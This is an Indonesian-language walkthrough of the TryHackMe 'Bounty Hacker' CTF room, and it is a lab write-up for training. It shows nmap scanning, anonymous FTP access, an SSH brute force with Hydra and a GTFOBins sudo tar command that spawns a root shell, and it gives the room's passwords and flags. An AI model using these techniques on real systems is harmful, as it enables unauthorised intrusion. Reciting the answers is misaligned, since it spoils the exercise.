# TryHackMe — Bounty Hacker CTF Walkthrough

> **"You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!"**

- **Link Room:** [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)

---

## Task 1 — Living up to the title

> *Kamu terus sesumbar tentang kemampuan hacker elitemu di bar, dan beberapa Bounty Hunter memutuskan untuk menagih klaimmu! Buktikan bahwa statusmu lebih dari sekadar beberapa gelas di bar. Kurasakan paprika & daging sapi di masa depanmu!*

---

### Pertanyaan 1 — Deploy the machine

 Jawaban: **No Answer Needed**

---

### Pertanyaan 2 — Find open ports on the machine

**Perintah:**
```bash
nmap -A -Pn -T5 <IP Mesin Kamu>
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for 10.10.54.142
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.2.79.42
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is encrypted
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

 Jawaban: **No Answer Needed**

---

### Pertanyaan 3 — Who wrote the task list?

Dengan menggunakan FTP, kita bisa masuk secara anonim dan menemukan dua file: `locks.txt` dan `task.txt`.

**Perintah:**
```bash
ftp <IP Mesin Kamu>
```

**Output login FTP:**
```
Connected to 10.10.54.142.
220 (vsFTPd 3.0.3)
Name (10.10.54.142:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
ftp> get task.txt
ftp> bye
```

**Isi file `locks.txt` (daftar password untuk di-brute force):**
```
rEddrAGON
ReDdr4gOn
RedDr4gonSynd1cat3
R3dDr4gonSynd1cat3
ReDDr4gonSynd1cat3
ReDdr4gonSynd1cat3
r3ddr4g0nSynd1cat3
ReDdr4g0nSynd1cat3
ReDDr4g0nSynd1cat3
r3ddr4g0nSynd1cat3
r3ddR4g0nSynd1cat3
r3dDr4g0nSynd1cat3
rEDdr4gonSynd1cat3
ReDdr4gonSynd1Cat3
r3ddr4gonSynd1cat3
```

**Isi file `task.txt`:**
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

Dari file `task.txt` di atas, kita mendapatkan nama yang menulis daftar tugas tersebut.

 Jawaban: **lin**

---

### Pertanyaan 4 — What service can you brute force with the text file found?

Dari hasil Nmap, kita melihat ada port 22 (SSH) yang terbuka. File `locks.txt` yang berisi daftar password bisa kita gunakan untuk brute force layanan ini.

 Jawaban: **SSH**

---

### Pertanyaan 5 — What is the user's password?

Kita gunakan **Hydra** untuk melakukan brute force password SSH dengan username `lin` dan wordlist `locks.txt`.

> Pastikan kamu berada di direktori yang sama dengan file `locks.txt` dan `task.txt`.

**Perintah:**
```bash
hydra ssh://10.10.54.142 -l lin -P locks.txt
```

**Output:**
```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting

[DATA] max 16 tasks per 1 server, overall 16 tasks, 15 login tries (l:1/p:15), ~1 try per task
[DATA] attacking ssh://10.10.54.142:22/
[22][ssh] host: 10.10.54.142   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

Jawaban: **`RedDr4gonSynd1cat3`**

---

### Pertanyaan 6 — user.txt

Gunakan kredensial yang didapat untuk login melalui SSH:

**Perintah:**
```bash
ssh lin@10.10.54.142
```

**Output:**
```
lin@10.10.54.142's password: RedDr4gonSynd1cat3

Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~$
```

Setelah berhasil masuk, cari dan baca file `user.txt`:

```bash
lin@bountyhacker:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  user.txt

lin@bountyhacker:~$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

Jawaban: **`THM{CR1M3_SyNd1C4T3}`**

---

### Pertanyaan 7 — root.txt

Sekarang kita perlu eskalasi hak akses untuk menjadi root. Pertama, cek privilege yang kita miliki:

```bash
lin@bountyhacker:~$ sudo -l
```

**Output:**
```
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Kita bisa menjalankan `/bin/tar` sebagai root! Mari kita cek [**GTFObins — tar**](https://gtfobins.github.io/gtfobins/tar/) untuk menemukan cara eksploitasinya.

GTFObins memberikan perintah berikut untuk eskalasi via `tar` dengan SUID/sudo:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**Output setelah menjalankan perintah:**
```
# whoami
root

# cat /root/root.txt
THM{80UN7Y_h4cK3r}
```

 Jawaban: **`THM{80UN7Y_h4cK3r}`**

---

## SELAMAT! Room Berhasil Ditaklukkan!

Kita telah berhasil menyelesaikan room **Bounty Hacker** di TryHackMe!

### Rangkuman Serangan

| Tahap | Teknik | Tool |
|-------|--------|------|
| Reconnaissance | Port scanning | Nmap |
| Enumeration | Login FTP anonim & download file | FTP |
| Initial Access | Brute force SSH dengan wordlist | Hydra |
| Privilege Escalation | Sudo abuse via `/bin/tar` | GTFObins |

---

## Referensi

- 🔗 [TryHackMe — Bounty Hacker Room](https://tryhackme.com/room/cowboyhacker)
- 🔗 [GTFObins — tar](https://gtfobins.github.io/gtfobins/tar/)
